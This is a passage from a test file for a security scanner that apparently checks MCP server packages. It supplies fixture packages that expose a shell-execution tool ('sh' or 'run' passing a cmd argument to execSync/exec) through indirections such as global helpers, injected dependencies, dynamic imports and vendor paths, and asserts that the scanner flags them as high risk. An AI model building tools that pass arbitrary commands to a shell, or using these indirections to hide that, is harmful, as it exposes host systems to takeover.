  ['startup bootstrap hands a function to the server', { 'bin/cli.js': "require('../dist/bootstrap.js');\nif (process.argv[2] === 'mcp') {\n  require('../dist/server.js');\n}\n", 'dist/bootstrap.js': "const { execSync } = require('child_process');\nglobalThis.__sh = (c) => execSync(c);\n", 'dist/server.js': SRV + "server.registerTool('sh', {}, async ({ cmd }) => globalThis.__sh(cmd));\n" }, { name: 'p', bin: { p: 'bin/cli.js' } }],
  ['entry injects a helper into the lazily-loaded server', { 'bin/cli.js': "const { execSync } = require('child_process');\nconst deps = { run: (c) => execSync(c) };\nif (process.argv[2] === 'mcp') {\n  require('../dist/server.js').start(deps);\n}\n", 'dist/server.js': "const { McpServer } = require('@modelcontextprotocol/sdk/server/mcp.js');\nexports.start = (deps) => {\n  const server = new McpServer({name:'x'});\n  server.registerTool('sh', {}, async ({ cmd }) => deps.run(cmd));\n};\n" }, { name: 'p', bin: { p: 'bin/cli.js' } }],
  ['incomplete server graph keeps other-entry files unknown', { 'dist/index.js': SRV + "for (const n of process.env.TOOLS.split(',')) { const m = await import('./tools/' + n + '.js'); server.registerTool(n, {}, m.handler); }", 'dist/cli.js': "import { handler } from './tools/shell.js';\nhandler({ cmd: process.argv[2] });", 'dist/tools/shell.js': "import { exec } from 'node:child_process';\nexport async function handler(args) { exec(args.cmd); return { content: [] }; }" }, { name: 'p', bin: { srv: 'dist/index.js', cli: 'dist/cli.js' } }],
  ['ternary dynamic import adds both edges', { 'dist/index.js': SRV + "const mod = process.env.HTTP ? './tools/http.js' : './tools/shell.js';\nconst m = await import(mod);\nserver.registerTool('run', {}, m.handler);", 'dist/tools/shell.js': "import { exec } from 'node:child_process';\nexport async function handler(args) { exec(args.cmd); return { content: [] }; }", 'dist/tools/http.js': 'export const handler = () => ({});' }, { name: 'p', bin: { srv: 'dist/index.js' } }],
  ['a vendor/ path the server loads is server code', { 'dist/index.js': SRV + "server.registerTool('sh', {}, require('./vendor/run'));\n", 'dist/vendor/run.js': "const { execSync } = require('child_process');\nmodule.exports = (args) => execSync(args.cmd);\n" }, { name: 'p', bin: { srv: 'dist/index.js' } }],
];
for (const [label, files, pkg] of REVIEW) {
  test(`review: ${label}`, async () => {
    const r = await scan(
      Object.entries(files).map(([path, content]) => ({ path, content })),
      pkg ? { files: { 'package.json': JSON.stringify(pkg) } } : undefined,
    );
    assert.ok(['high', 'critical'].includes(r.capabilityProfile.level), `capability ${r.capabilityProfile.level}`);
    assert.ok(by(r, 'MTC-SRC-002').some((f: any) => f.severity === 'high'), 'a high SRC-002 remains');
  });
}

test('review: run of blank lines and spaces after import scan in linear time', async () => {
  const t0 = Date.now();
  await one('function f(a){return a}' + '\n'.repeat(8000) + '}');
  await one('import' + ' '.repeat(8000) + 'x');
  assert.ok(Date.now() - t0 < 3000, `took ${Date.now() - t0} ms`);
});
